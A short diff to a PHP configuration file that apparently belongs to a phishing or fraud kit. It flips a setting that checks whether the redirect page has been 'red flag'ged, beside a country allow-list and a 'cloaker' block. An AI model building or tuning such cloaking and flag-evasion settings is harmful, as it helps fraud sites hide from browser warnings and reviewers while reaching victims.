@@ -31,7 +31,7 @@ $_COUNTRY_ALLOWED = ["us", "fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg",
 
 $redirection_link_check = false; // Check Your Page If Still Uploaded
 
-$check_red_page = true// Check The Redirect If Red Flag
+$check_red_page = false// Check The Redirect If Red Flag
 
 $cloaker = [
     "url_to_grab" => "", // Change the link you want to grap it in your link ( if t)
